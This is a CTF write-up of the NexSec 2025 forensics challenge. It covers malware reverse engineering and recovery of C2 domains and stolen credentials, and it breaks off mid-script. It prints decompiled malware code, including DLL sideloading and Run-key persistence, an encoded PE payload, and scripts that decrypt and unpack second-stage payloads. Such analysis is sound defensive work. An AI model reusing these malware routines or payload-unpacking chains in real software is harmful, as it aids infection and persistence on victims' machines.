---
title: "NexSec 2025 Intervarsity Cyber Forensics Challenge"
date: 2025-12-13 00:00 +0800
categories: [CTF, Forensics]
tags: [ctf, forensics, malware-analysis, incident-response, reverse-engineering, memory-dump]
image: <img width="975" height="548" alt="image" src="https://github.com/user-attachments/assets/c5c2ae4a-4396-48ea-a1de-483bb203e305" />
---

## Summary

This CTF focused heavily on digital forensics, malware analysis, incident response, and reverse engineering. The challenges involved analyzing compromised systems, memory dumps, malicious documents, and various attack techniques including C2 communication, credential dumping, and persistence mechanisms.

The NexSec 2025 Intervarsity Cyber Forensics Challenge was held from December 12-14, 2025. Our team **NoobMaster#542656942** (zeqzoq, 4ry, me) participated and achieved **Top 10** placement. Due to a schedule conflict, we withdrew from the final round scheduled for December 18-19.

## Table of Contents

- [Reverse Engineering](#reverse-engineering)
  - [Residual Implant](#residual-implant)
- [Advisory Deception Series](#advisory-deception)
  - [Advisory Deception #1](#advisory-deception-1)
  - [Advisory Deception #2](#advisory-deception-2)
  - [Advisory Deception #3](#advisory-deception-3)
  - [Advisory Deception #4](#advisory-deception-4)
- [Network Forensics](#network-forensics)
  - [Stolen Credentials](#stolen-credentials)
  - [QuackBot](#quackbot)
- [Malware Analysis](#malware-analysis)
  - [Rembayung #1](#rembayung-1)
  - [Rembayung #2](#rembayung-2)
  - [Speed Test Anomaly Series](#speed-test-anomaly-series)
  - [Photo Viewer Gone Rogue](#photo-viewer-gone-rogue)
  - [Birthday Trap](#birthday-trap)
- [Incident Response](#incident-response)
  - [Here's the Dump Series](#heres-the-dump-series)
  - [Breadcrumbs Series](#breadcrumbs-series)
  - [Classic Series](#classic-series)
  - [Security Incident](#security-incident)
- [Digital Forensics](#digital-forensics)
  - [OhMyFiles Series](#ohmyfiles-series)
  - [MEMOIR Series](#memoir-series)

## Tools Used

- **Reverse Engineering**: IDA Pro, Ghidra, Python
- **Memory Forensics**: Volatility 3, strings, grep
- **Malware Analysis**: dnSpy, de4dot, PE-bear, CyberChef, oletools, VirusTotal
- **Network Analysis**: Wireshark, tcpdump, NetworkMiner
- **Forensics Tools**: FTK Imager, Autopsy, RegRipper, AmcacheParser
- **General**: Python scripting, xxd, file, base64, PowerShell analysis

## Reverse Engineering

### Residual Implant

**Challenge Description:**
Following a compromise assessment, analysts extracted a small residual binary believed to have been part of a macOS backdoor. Reverse-engineer the binary and determine the C2 domain used by the implant.

**Solution:**

1. Using the `file` command, we discovered the binary contains two different architectures (Mach-O universal binary)

<img width="891" height="169" alt="image" src="https://github.com/user-attachments/assets/59ef15a8-3b6a-4c9c-97e2-c7aa271dfd80" />

2. Extracted both architectures for analysis

<img width="888" height="99" alt="image" src="https://github.com/user-attachments/assets/05618c61-5ac5-449c-bc59-3f278a5e4aae" />

4. In the `_main` function, we identified:
   - A decryption loop that reads bytes from `__TEXT,__const`
   - Dynamic function name building using XOR operations

5. We dumped the `__const` section to locate the encrypted blob

6. Created a Python script to decrypt the blob:

```python
#!/usr/bin/env python3
from pathlib import Path

MASK = (1 << 64) - 1

def decrypt_blob(enc: bytes) -> bytes:
    out = bytearray(0x264)
    out[0:4] = (0x00905A4D).to_bytes(4, "little")  # "MZ\x90\x00"
    
    rdx = 0x00905A4D
    rdi = 0x200000005
    r9 = 0x2000000040000001
    rsi = 5
    
    while rsi != 0x265:
        rcx = (rdx * 0x38AAA0C8) & MASK
        prod = rcx * rdi
        rdx_mul = (prod >> 64) & MASK
        r10 = (rcx - rdx_mul) & MASK
        r10 = (r10 >> 1) & MASK
        r10 = (r10 + rdx_mul) & MASK
        r10 = (r10 >> 0x1E) & MASK
        rax = (r10 << 0x1F) & MASK
        # ... (decryption logic continues)
```

6. After decryption, we extracted the C2 domain from the decrypted data

<img width="884" height="361" alt="image" src="https://github.com/user-attachments/assets/872f3c02-0237-48ff-a7de-3ce6683bf6c6" />

**Flag:** `NEXSEC25{Pvt3QG28pg.capturextheflag.io}`

---

### Advisory Deception #1

**Challenge:** During a routine security audit, our team intercepted a suspicious binary that was distributed to several network administrators. The file was delivered via email, claiming to contain an urgent "Internet Protocol Governance & Standards Advisory - March 2025" document.

The binary presents itself as a legitimate document viewer, but preliminary analysis suggests otherwise. Reverse-engineer the binary and identify the DLL name used by the malware to blend in with legitimate system files.

ps: infected

Disclaimer: This malware sample was created exclusively for the NEXSEC CTF competition. The authors are not responsible for any damages caused by misuse. All analysis should only be performed in a secure, isolated environment such as a virtual machine or sandbox.

**Solution:**

From the docs there is actually an exe where it rename to a long file name to hide exe extension. 

<img width="418" height="304" alt="image" src="https://github.com/user-attachments/assets/50fa0547-7618-44c3-8390-0f87ef574e7f" />

We decompile it using IDA and look for the main function. and see for any malware function.

<img width="954" height="383" alt="image" src="https://github.com/user-attachments/assets/cdb3c56e-4be8-49cd-b371-7ea24f63e92c" />

We found that sub_140001450 is one of the important function.

```
__int64 __fastcall sub_140001450(int a1, __int64 a2)
{
  CHAR Filename[272]; // [rsp+30h] [rbp-50h] BYREF
  void (*v4)(void); // [rsp+140h] [rbp+C0h]
  FARPROC ProcAddress; // [rsp+148h] [rbp+C8h]
  HINSTANCE v6; // [rsp+150h] [rbp+D0h]
  LPCSTR lpFile; // [rsp+158h] [rbp+D8h]
  HMODULE hModule; // [rsp+160h] [rbp+E0h]
  int i; // [rsp+16Ch] [rbp+ECh]

  sub_140001740();
  hModule = LoadLibraryA("vcruntime140.dll");
  if ( !GetModuleFileNameA(0LL, Filename, 0x104u) )
  {
    puts("Failed to get module filename");
    return 1LL;
  }
  if ( a1 <= 1 )
  {
    lpFile = "Internet Protocol Governance.docx";
    v6 = ShellExecuteA(0LL, "open", "Internet Protocol Governance.docx", 0LL, 0LL, 1);
    ProcAddress = GetProcAddress(hModule, "__vcrt_InitializeCriticalSectionEx");
    if ( !ProcAddress )
    {
LABEL_7:
      GetLastError();
      sub_1400027C0("GetProcAddress failed: %lu\n");
      return 1LL;
    }
    ((void (__fastcall *)(CHAR *))ProcAddress)(Filename);
  }
  else
  {
    for ( i = 1; i < a1; ++i )
    {
      if ( !strcmp(*(const char **)(8LL * i + a2), "-accepteula") )
      {
        v4 = (void (*)(void))GetProcAddress(hModule, "_CreateFrameInfo");
        if ( !v4 )
          goto LABEL_7;
        v4();
      }
    }
  }
  FreeLibrary(hModule);
  return 0LL;
}
```

from the code it loadlibraryA **vcruntime140.dll**. that’s the DLL name used by the malware to blend in with legitimate system files.

**Flag:** `NEXSEC25{vcruntime140.dll}`

### Advisory Deception #2

**Challenge:** What directory does the malware copy itself to?

**Solution:**

From last question, we decompile the **vcruntime140.dll**. Exploring the dll decompilation.

<img width="390" height="450" alt="image" src="https://github.com/user-attachments/assets/cedcffa4-1cb1-4b16-80d2-9238d8d7b598" />

On **sub_25D7F2212** shows some of the behavior. correlating with other function:

```
_BOOL8 sub_25D7F2212()
{
  int v1; // eax
  HKEY hKey; // [rsp+38h] [rbp-28h] BYREF
  LSTATUS v3; // [rsp+44h] [rbp-1Ch]
  char *Str; // [rsp+48h] [rbp-18h]
  LPCSTR lpValueName; // [rsp+50h] [rbp-10h]
  LPCSTR lpSubKey; // [rsp+58h] [rbp-8h]

  lpSubKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
  lpValueName = "MicrosoftSyncService";
  Str = "C:\\ProgramData\\MicrosoftSyncService\\WF_Microsoft_Sync_Service.exe -accepteula";
  if ( RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 2u, &hKey) )
    return 0LL;
  v1 = strlen(Str);
  v3 = RegSetValueExA(hKey, lpValueName, 0, 1u, (const BYTE *)Str, v1 + 1);
  RegCloseKey(hKey);
  return v3 == 0;
}
```
The malware does copy itself to the directory **MicrosoftSyncService**
**Flag:** `NEXSEC25{C:\Programdata\MicrosoftSyncService}`

### Advisory Deception #3

**Challenge:** Uncover the exported function used to achieve persistence.

**Solution:**

Then see the exported function the dll uses
<img width="842" height="388" alt="image" src="https://github.com/user-attachments/assets/b3c77cbf-2e92-47e3-affa-caf6b4c75fd8" />

**Flag:** `NEXSEC25{__vcrt_InitializeCriticalSectionEx}`

### Advisory Deception #4

**Challenge:** What is the command and control (C2) domain that the implant communicates with?

**Solution:**

We can find the C2 domain from **[virus total relations](https://www.virustotal.com/gui/file/3b1aa537ff843d5a269f99ea8f18182c94f84b4218c677aaf74aba010a0998d9/relations)**

<img width="975" height="460" alt="image" src="https://github.com/user-attachments/assets/738f4c48-dfba-43f9-9e48-5b3f4c735a95" />

**Flag:** `NEXSEC25{fj3m58a9.capturextheflag.io}`

---

## Network Forensics

### Stolen Credentials

**Challenge:** During an incident response, we discovered a suspicious binary  (soso.exe) that was encrypting harvested credentials before  storing them in password.txt.

**Solution:**

1. We extracted a 32-byte Key and an 8-byte Nonce from the challenge binary/script.
Key: D3FC98F246D58C002285904D6120D205CD7EB0B54245764BE494712A7AEC549E
Nonce: 1C0AEA05C0AEAE60
2. The file password.txt contained the Base64 string: l/91qeiC30SlA/2t9i/v59T/3QbU

```
//solve.py
from Crypto.Cipher import Salsa20  # Changed from ChaCha20 to Salsa20
import binascii
import base64

Extracted Parameters
KEY_HEX = "D3FC98F246D58C002285904D6120D205CD7EB0B54245764BE494712A7AEC549E"
NONCE_HEX = "1C0AEA05C0AEAE60"

Target Ciphertext (from password.txt)
CIPHERTEXT_B64 = "l/91qeiC30SlA/2t9i/v59T/3QbU"

def solve():
    try:
        print(f"[*] Ciphertext (B64): {CIPHERTEXT_B64}")

Decode inputs
        key = binascii.unhexlify(KEY_HEX)
        nonce = binascii.unhexlify(NONCE_HEX)
        ciphertext = base64.b64decode(CIPHERTEXT_B64)

        # Initialize Cipher: Salsa20
        cipher = Salsa20.new(key=key, nonce=nonce)

Decrypt
        plaintext = cipher.decrypt(ciphertext)

Print Result
We try to decode as UTF-8. If it fails, we print the raw representation.
        try:
            print(f"\n[+] FLAG: {plaintext.decode('utf-8')}")
        except UnicodeDecodeError:
            print(f"\n[!] Decoding Error. Raw Output: {plaintext}")

    except Exception as e:
        print(f"[!] Error: {e}")

if name == "main":
    solve()

//NEXSEC25{QWERTYasdfg12345!@#$%}
```

**Flag:** `NEXSEC25{QWERTYasdfg12345!@#$%}`

### QuackBot

**Challenge:** We identified a phishing campaign that uses several evasion techniques to deliver malware. Our visibility is limited to the malicious email attachment; any activity beyond that point requires further malware analysis. Analyse the malware to find what evil action being done by it.

**Solution:**

Changed the extension from .quack to .pyc and This is the output from pylingual we can see that it is obfuscated with kramer

<img width="975" height="485" alt="image" src="https://github.com/user-attachments/assets/92b48e06-2c1d-4160-95d0-d04f651a0d38" />

So after researching for quite awhile i stumbled upon this **[deobfuscator tool](https://github.com/jcarndt/kramer_decryptor)**

Then we’ll get the deobfuscated file, there were a long b64 blob and a key ***‘My53cretk3yzztew’***

<img width="975" height="331" alt="image" src="https://github.com/user-attachments/assets/3b21f26e-2b33-4ed5-9747-24ebdfb2709a" />

We figured it is encrypted via RC4. Script to decode from RC4

```
#!/usr/bin/env python3
import base64, re, sys

inp = sys.argv[1] if len(sys.argv) > 1 else "QuackBot.pyc_decrypted_638238.py.txt"
txt = open(inp, "r", encoding="utf-8", errors="ignore").read()

b64m = re.search(r"base64\.b64decode\('([^']+)'\)", txt)
keym = re.search(r"key\s*=\s*'([^']+)'\.encode\('ascii'\)", txt)
if not b64m or not keym:
    raise SystemExit("[-] Couldn't find base64 blob or key in the decrypted python text")

ct = base64.b64decode(b64m.group(1))
key = keym.group(1).encode("ascii")

# RC4 (KSA + PRGA)
S = list(range(256))
j = 0
for i in range(256):
    j = (j + S[i] + key[i % len(key)]) & 0xFF
    S[i], S[j] = S[j], S[i]

out = bytearray()
i = j = 0
for b in ct:
    i = (i + 1) & 0xFF
    j = (j + S[i]) & 0xFF
    S[i], S[j] = S[j], S[i]
    k = S[(S[i] + S[j]) & 0xFF]
    out.append(b ^ k)

open("payload.bin", "wb").write(out)
print(f"[+] wrote payload.bin ({len(out)} bytes)")
print("[+] first 16 bytes:", out[:16].hex())
```

Then we extract stage0 container from payload.bin

```
#!/usr/bin/env python3
import struct

buf = open("payload.bin", "rb").read()

base = 0x5                       # size dword starts at offset 5
size = struct.unpack_from("<I", buf, base)[0]

open("stage0_container.bin", "wb").write(buf[base:base+size])
print(f"[+] size field: 0x{size:x}  wrote stage0_container.bin ({size} bytes)")
```

After that we decrypt stage0 blob 
```
#!/usr/bin/env python3
import struct

M32 = 0xFFFFFFFF

def rol(x, r): return ((x << r) | (x >> (32 - r))) & M32
def ror(x, r): return ((x >> r) | (x << (32 - r))) & M32

def keystream_block(counter16: bytes, key16: bytes) -> bytes:
    # state = counter ^ key (4 little-endian dwords)
    w = [struct.unpack_from("<I", counter16, i*4)[0] ^ struct.unpack_from("<I", key16, i*4)[0] for i in range(4)]
    a, b, c, d = w[0], w[1], w[2], w[3]

    # 0x10 rounds (matches the 0x8455 ARX loop you disassembled)
    for _ in range(0x10):
        r8 = (b + a) & M32
        c  = (c + d) & M32
        b  = rol(b, 5)
        b ^= r8
        r8 = ror(r8, 16)
        d  = rol(d, 8)
        d ^= c
        c  = (c + b) & M32
        b  = ror(b, 0x19)
        b ^= c
        c  = ror(c, 16)
        a  = (r8 + d) & M32
        d  = ror(d, 0x13)
        d ^= a

    # xor with key again (the second xor loop in 0x8455)
    a ^= struct.unpack_from("<I", key16, 0)[0]
    b ^= struct.unpack_from("<I", key16, 4)[0]
    c ^= struct.unpack_from("<I", key16, 8)[0]
    d ^= struct.unpack_from("<I", key16, 12)[0]

    return struct.pack("<IIII", a, b, c, d)

def inc_counter_be(c: bytearray):
    # increments from last byte with carry (like the add-at-[15] then carry-left loop)
    for i in range(15, -1, -1):
        c[i] = (c[i] + 1) & 0xFF
        if c[i] != 0:
            break

buf = bytearray(open("stage0_container.bin", "rb").read())

KEY_OFF = 0x04
CTR_OFF = 0x14
DATA_OFF = 0x23C
DATA_LEN = 0x5184

key = bytes(buf[KEY_OFF:KEY_OFF+16])
ctr = bytearray(buf[CTR_OFF:CTR_OFF+16])

print("[+] key:", key.hex())
print("[+] ctr:", bytes(ctr).hex())
print(f"[+] decrypting @0x{DATA_OFF:x} len=0x{DATA_LEN:x}")

for i in range(0, DATA_LEN, 16):
    ks = keystream_block(bytes(ctr), key)
    chunk = min(16, DATA_LEN - i)
    for j in range(chunk):
        buf[DATA_OFF + i + j] ^= ks[j]
    inc_counter_be(ctr)

open("stage0_decrypted.bin", "wb").write(buf)
print("[+] wrote stage0_decrypted.bin")
```
Last but not least we carve the embedded PE from stage0_decrypted.bin to carved_stage1.exe
```
#!/usr/bin/env python3
import struct

b = open("stage0_decrypted.bin", "rb").read()

def find_pe():
    for off in range(len(b) - 0x200):
        if b[off:off+2] != b"MZ":
            continue
        e = struct.unpack_from("<I", b, off+0x3c)[0]
        pe = off + e
        if 0 <= pe < len(b)-4 and b[pe:pe+4] == b"PE\x00\x00":
            return off
    return None

mz = find_pe()
if mz is None:
    raise SystemExit("[-] No valid MZ/PE found")

e_lfanew = struct.unpack_from("<I", b, mz+0x3c)[0]
pe = mz + e_lfanew

Machine, nsec, _, _, _, optsz, _ = struct.unpack_from("<HHIIIHH", b, pe+4)
sec_off = (pe + 24) + optsz

end = 0
for i in range(nsec):
    sh = sec_off + i*40
    sz_raw, ptr_raw = struct.unpack_from("<II", b, sh+16)
    end = max(end, ptr_raw + sz_raw)

pe_bytes = b[mz:mz+end]
open("carved_stage1.exe", "wb").write(pe_bytes)
print(f"[+] PE @ 0x{mz:x}  Machine=0x{Machine:x}  sections={nsec}  size=0x{len(pe_bytes):x}")
print("[+] wrote carved_stage1.exe")
```
To get the flag we can actually do 2 ways either strings or decompile it to get the values, i did both just to make sure but imma just put strings here. the flag bytes are stored as dot-separated octal numbers

```
strings -a carved_stage1.exe | grep -E '([0-7]{1,3}\.){8,}[0-7]{1,3}'

156.145.170.163
145.143.62.65
173.65.61.63
141.146.143.61
62.67.62.142
64.60.66.66
70.71.71.65
144.141.63.146
66.71.146.141
145.145.145.65
142.63.67.144
144.65.70.142
145.143.143.143
71.146.142.146
64.61.143.143
63.142.64.64
141.65.70.66
66.71.144.145
66.175
```

Decode them with **[CyberChef](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Simple%20string','string':'.'%7D,'%20',true,false,true,false)Find_/_Replace(%7B'option':'Extended%20(%5C%5Cn,%20%5C%5Ct,%20%5C%5Cx...)','string':'%5C%5Cn'%7D,'%20',true,false,true,false)From_Octal('Space')&input=MTU2LjE0NS4xNzAuMTYzDQoxNDUuMTQzLjYyLjY1DQoxNzMuNjUuNjEuNjMNCjE0MS4xNDYuMTQzLjYxDQo2Mi42Ny42Mi4xNDINCjY0LjYwLjY2LjY2DQo3MC43MS43MS42NQ0KMTQ0LjE0MS42My4xNDYNCjY2LjcxLjE0Ni4xNDENCjE0NS4xNDUuMTQ1LjY1DQoxNDIuNjMuNjcuMTQ0DQoxNDQuNjUuNzAuMTQyDQoxNDUuMTQzLjE0My4xNDMNCjcxLjE0Ni4xNDIuMTQ2DQo2NC42MS4xNDMuMTQzDQo2My4xNDIuNjQuNjQNCjE0MS42NS43MC42Ng0KNjYuNzEuMTQ0LjE0NQ0KNjYuMTc1&ieol=CRLF)**

<img width="1308" height="787" alt="image" src="https://github.com/user-attachments/assets/3119a8a0-1c9d-4ffd-8cd6-1fef55381e79" />

**Flag:** `nexsec25{513afc1272b40668995da3f69faeee5b37dd58beccc9fbf41cc3b44a58669de6}`

---

## Malware Analysis

### Rembayung #1

**Challenge:** 

> One of our employees received an email inviting them to the opening ceremony of a restaurant. The email appeared suspicious, and fortunately our email system automatically quarantined it.
> Could you help us locate the payload?
> 
> Flag Format: nexsec25{place}
> 
> ps: infected
> 
> Disclaimer: This malware is used the competition MCMC CTF. Netbytesec is not responsible for any damages caused as a result of inappropriate use of this malware. All examination of malicious files should only be performed inside a secure, isolated, and controlled environment


**Solution:**

We can find the payload by **exiftool** the `.docm` file
<img width="904" height="735" alt="image" src="https://github.com/user-attachments/assets/6cb918af-c4dd-4dba-81c9-65767c395830" />


**Flag:** `nexsec25{Description}`

### Rembayung #2

**Challenge:** 
> Give the SHA256 of the malware
>
> Flag Format: nexsec25{hashvalue}

**Solution:**

Extract and decode base64 payload from the description
```
(base)┌──(akmal㉿parrot)-[~/Desktop]
└─$ echo "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAAZIYKAJOrO2kAAAAAAAAAAPAALgILAgIqABoAAAA2AAAAAgAA8BMAAAAQAAAAAABAAQAAAAAQAAAAAgAABAAAAAAAAAAFAAIAAAAAAADAAAAABAAAac8AAAMAYAEAACAAAAAAAAAQAAAAAAAAAAAQAAAAAAAAEAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAgAAAhAYAAAAAAAAAAAAAAFAAACgCAAAAAAAAAAAAAACwAAB8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEAAACgAAAAAAAAAAAAAAAAAAAAAAAAAyIEAAHgBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAABgYAAAAEAAAABoAAAAEAAAAAAAAAAAAAAAAAABgAABgLmRhdGEAAACQAAAAADAAAAACAAAAHgAAAAAAAAAAAAAAAAAAQAAAwC5yZGF0YQAAcAUAAABAAAAABgAAACAAAAAAAAAAAAAAAAAAAEAAAEAucGRhdGEAACgCAAAAUAAAAAQAAAAmAAAAAAAAAAAAAAAAAABAAABALnhkYXRhAACcAQAAAGAAAAACAAAAKgAAAAAAAAAAAAAAAAAAQAAAQC5ic3MAAAAAgAEAAABwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAMAuaWRhdGEAAIQGAAAAgAAAAAgAAAAsAAAAAAAAAAAAAAAAAABAAADALkNSVAAAAABgAAAAAJAAAAACAAAANAAAAAAAAAAAAAAAAAAAQAAAwC50bHMAAAAAEAAAAACgAAAAAgAAADYAAAAAAAAAAAAAAAAAAEAAAMAucmVsb2MAAHwAAAAAsAAAAAIAAAA4AAAAAAAAAAAAAAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMNmZi4PH4QAAAAAAA8fQABIg+
… +Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUAkAAAEAAAAAigIKA4oECgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==" | base64 -d > file.bin

(base)┌──(akmal㉿parrot)-[~/Desktop]
└─$ sha256sum file.bin 
ca9e35196f04dca67275784a8bd05b9c4e7058721204ccd5eef38244b954e1c3  file.bin
```

**Flag:** `NEXSEC25{ca9e35196f04dca67275784a8bd05b9c4e7058721204ccd5eef38244b954e1c3}`

### Speed Test Anomaly Series (Initial Discovery)

> A user reported that they downloaded a network speed testing utility from a third-party website to diagnose their slow internet connection. The application claims to measure download/upload speeds and display detailed network statistics.
>
> However, after running the tool, the user noticed unusual outbound network traffic that didn't match typical speed test patterns. The security team suspects this may be a disguised threat and needs to identify the threat actor's infrastructure. 

**Findings:**
We got a file called NetworkSpeed.exe. Check the file type

```
(base) ┌─[akmal@parrot]─[/tmp/ns2]
└──╼ $file NetworkSpeed.exe
NetworkSpeed.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Open `ILSpy` and look for main which called **MainForm**

<img width="384" height="138" alt="image" src="https://github.com/user-attachments/assets/73a2b295-4dce-4d16-8ce7-142de7c9da76" />

In the class **MainForm**, the function `RunNetworkBenchmark()` searches the executable for embedded resources

<img width="779" height="176" alt="image" src="https://github.com/user-attachments/assets/e220cb98-a076-4fa4-9148-87217b20812d" />

In **MeasureDownloadSpeed**, The program then reads bytes from pixels in order:
●	take R, then G, then B
●	keep going until it collects num bytes
●	it skips the first two pixels on the first row because those were used for the length header

We figured to we need C# script to build **SecondStage.dll**. Used gpt for that:

```
//SecondStage.cs
using System;
using System.Drawing;
using System.IO;

class SecondStage
{
    public static byte[] MeasureDownloadSpeed(Bitmap networkStream)
    {
        // Read payload size from the first two pixels:
        // num = (P(0,0).G << 24) | (P(0,0).B << 16) | (P(0,0).R << 8) | P(1,0).G
        Color pixel = networkStream.GetPixel(0, 0);
        Color pixel2 = networkStream.GetPixel(1, 0);
        int num = (pixel.G << 24) | (pixel.B << 16) | (pixel.R << 8) | pixel2.G;

        // Extract raw payload bytes from subsequent pixels (R, then G, then B)
        byte[] array = new byte[num];
        int num2 = 0;

        for (int i = 0; i < networkStream.Height && num2 < num; i++)
        {
            int startX = (i == 0) ? 2 : 0; // skip first two pixels on first row
            for (int j = startX; j < networkStream.Width && num2 < num; j++)
            {
                Color pixel3 = networkStream.GetPixel(j, i);

                if (num2 < num) array[num2++] = pixel3.R;
                if (num2 < num) array[num2++] = pixel3.G;
                if (num2 < num) array[num2++] = pixel3.B;
            }
        }

        // De-obfuscate the extracted bytes into the final DLL bytes
        return CalculateThroughput(array);
    }

    public static byte[] TestLatency(Stream benchmarkStream)
    {
        using (Bitmap networkStream = new Bitmap(benchmarkStream))
        {
            return MeasureDownloadSpeed(networkStream);
        }
    }

    private static byte[] CalculateThroughput(byte[] packetData)
    {
        // Simple reversible transform:
        // b2 ^= (len - i)
        // b3 = ROTR4(b2) ^ i ^ 0x7A
        byte key = 0x7A; // 122
        int ror = 4;

        byte[] output = new byte[packetData.Length];
        for (int i = 0; i < packetData.Length; i++)
        {
            byte b2 = packetData[i];
            b2 ^= (byte)((packetData.Length - i) & 0xFF);

            byte rotated = (byte)((b2 >> ror) | (b2 << (8 - ror)));
            output[i] = (byte)(rotated ^ (byte)(i & 0xFF) ^ key);
        }
        return output;
    }

    static void Main()
    {
        // Reads the BMP carrier and writes the recovered second-stage DLL
        const string bmpPath = "NetworkSpeed.Resources.NetworkIcon.bmp";
        const string outPath = "SecondStage.dll";

        using (FileStream fs = File.OpenRead(bmpPath))
        {
            byte[] dllBytes = TestLatency(fs);
            File.WriteAllBytes(outPath, dllBytes);
            Console.WriteLine("Wrote " + outPath + " (" + dllBytes.Length + " bytes)");
        }
    }
}
```

### Speed Test Anomaly #1

**Challenge:** 
> Identify the library name used by the malware to detect sandbox environments

<img width="703" height="374" alt="image" src="https://github.com/user-attachments/assets/b7768370-a544-402a-92c4-95dbf90c7095" />

Found this function in **NetworkValidator** which use `SbieDLL.dll` module. The function checks for the presence of `SbieDll.dll`, which is commonly loaded by Sandboxie. If the module is found, it assumes it is running in a sandbox environment.

<img width="719" height="247" alt="image" src="https://github.com/user-attachments/assets/37bc1c3b-229d-418b-b3e8-292e3713a2e4" />

**Flag:** `NEXSEC25{SbieDll.dll}`

### Speed Test Anomaly #2:

**Challenge:**
> What is the minimum system drive size (in GB) required for the malware to execute?

**Solution:**

Found this function in `ValidateNetworkSettings()`

<img width="761" height="270" alt="image" src="https://github.com/user-attachments/assets/8535cb71-1983-41da-9ed7-7c1f4ef755ab" />

From the code we find:

- It gets the system drive (usually C:\) using Environment.SystemDirectory
- Checks the drive’s TotalSize (in bytes)
- If the drive size is ≤ 61,000,000,000 bytes, it returns true

61,000,000,000 bytes = 61GB

**Flag:** `NEXSEC25{61}`

### Speed Test Anomaly #3:
**Challenge:**
> What filename does the malware use to save captured screenshots?

For this one, I rely on GPT fully. But here’s the summary: 

```
I got it by extracting and decoding the hidden .NET payload from the embedded BMP, then pulling the payload’s Unicode strings.

Here’s what I did (exactly matching the functions in your VB code):

Export/open the embedded resource NetworkSpeed.Resources.NetworkIcon.bmp.

Recreate MeasureDownloadSpeed(bitmap):

Read pixels (0,0) and (1,0) to compute the payload length:

len = p00.G<<24 | p00.B<<16 | p00.R<<8 | p10.G

Walk the image pixels (row 0 starts at x=2, other rows x=0), and append bytes in R, G, B order into a buffer.

Recreate CalculateThroughput(packetData) to decrypt:

b2 = packet[i] XOR ((len - i) & 255)

rotate right by 4 bits

out[i] = rotated XOR (i & 255) XOR 0x7A

The output starts with MZ → it’s a valid PE/.NET assembly.

Run Unicode strings on the decoded payload and grep for image extensions:

strings -a -el payload_from_bmp.bin | grep -Ei "\.jpg|\.png"

That yields:

\aSdFgHjKl\QwErTyUiOp\ZxCvBnMl.jpg

So the screenshot filename used is:

ZxCvBnMl.jpg

(That full string is hardcoded inside the decoded payload, not in the loader stub you pasted.)
```

**Flag:** `NEXSEC25{ZxCvBnMl.jpg}`

**Speed Test Anomaly #4:**
**Challenge:**
> As usual, extract the domain used by the attacker.

**Solution:**

Decode network secret in **NetworkConfig**

<img width="975" height="48" alt="image" src="https://github.com/user-attachments/assets/920ab6b0-b3f1-404a-946b-1dc925f144c1" />

```
(base) ┌─[✗]─[akmal@parrot]─[~/Desktop]
└──╼ $echo -n "QWdYdDZUc2R3bTE4Y3p5Y2UycXpwN3RoTDhIbmc2eHc=" | base64 -d; echo
AgXt6Tsdwm18czyce2qzp7thL8Hng6xw
```

these are the variable with encrypted value **NetworkConfig.TelemetryNetwork** & **NetworkConfig.ConnectivityModule**, and this is the **protocolSalt**

<img width="975" height="48" alt="image" src="https://github.com/user-attachments/assets/7f4c3428-01d1-4870-8190-da251cccf515" />

<img width="655" height="146" alt="image" src="https://github.com/user-attachments/assets/5e8b8510-c1a7-4f7d-b32d-e0e487856032" />

Script to generate the AES Key and IV to decrypt the other strings:
```
//solve.py
import hashlib
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

# 1. Configuration from C# Code
# The password found in "SecureChannelProvider"
network_secret = "AgXt6Tsdwm18czyce2qzp7thL8Hng6xw"

# The hardcoded salt from FetchRemoteProfile.protocolSalt
salt_bytes = bytes([
    191, 235, 30, 86, 251, 205, 151, 59, 178, 25,
    2, 36, 48, 165, 120, 67, 0, 61, 86, 68,
    210, 30, 98, 185, 212, 241, 128, 231, 230, 195,
    57, 65
])
iterations = 50000

# 2. Key Derivation (PBKDF2 - matches Rfc2898DeriveBytes)
